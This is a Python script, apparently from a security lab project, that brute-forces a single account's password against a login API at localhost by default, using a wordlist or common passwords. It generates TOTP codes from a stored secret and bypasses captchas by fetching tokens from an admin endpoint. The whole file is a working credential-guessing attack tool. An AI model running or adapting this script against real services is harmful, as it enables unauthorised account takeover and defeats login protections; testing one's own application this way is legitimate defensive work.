import argparse
import json
import time
from pathlib import Path
import sys

import pyotp
import requests

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.append(str(ROOT))

from app.config import load_config


CFG = load_config()


def load_secret(username: str) -> str | None:
    path = Path("data/users.json")
    if not path.exists():
        return None
    users = json.loads(path.read_text())
    for u in users:
        if u["username"] == username:
            return u.get("totp_secret")
    return None


def get_captcha_token(base_url: str) -> str | None:
    try:
        resp = requests.get(f"{base_url}/admin/get_captcha_token", params={"group_seed": CFG.group_seed}, timeout=5)
        if resp.status_code == 200:
            return resp.json().get("captcha_token")
    except Exception:
        return None
    return None


def attack(args):
    passwords = []
    if args.wordlist:
        passwords = [line.strip() for line in open(args.wordlist, "r", encoding="utf-8") if line.strip()]
    else:
        passwords = ["password", "123456", "letmein", "welcome", "Password1!"]

    totp_secret = load_secret(args.username)
    session = requests.Session()
    total = 0
    start = time.time()
    for pwd in passwords:
        total += 1
        payload = {"username": args.username, "password": pwd}
        url = f"{args.base}/login"
        if args.totp and totp_secret:
            payload["totp_code"] = pyotp.TOTP(totp_secret).now()
            url = f"{args.base}/login_totp"

        resp = session.post(url, json=payload, timeout=5)
        print(resp)
        data = resp.json()
        result = data.get("result")
        print(f"[{total}] {pwd} -> {result}")

        if result == "success":
            duration = time.time() - start
            print(f"Success after {total} attempts in {duration:.2f}s")
            return

        if data.get("captcha_required"):
            token = get_captcha_token(args.base)
            if token:
                payload["captcha_token"] = token
                resp = session.post(url, json=payload, timeout=5)
                data = resp.json()
                print(f"captcha retry -> {data.get('result')}")
                if data.get("result") == "success":
                    duration = time.time() - start
                    print(f"Success after {total} attempts in {duration:.2f}s (with captcha)")
                    return
    print("No success")


def main():
    parser = argparse.ArgumentParser(description="Brute-force a single account")
    parser.add_argument("username")
    parser.add_argument("--wordlist", help="path to wordlist")
    parser.add_argument("--base", default="http://127.0.0.1:8000", help="API base URL")
    parser.add_argument("--totp", action="store_true", help="use /login_totp with TOTP if secret known")
    args = parser.parse_args()
    attack(args)


if __name__ == "__main__":
    main()
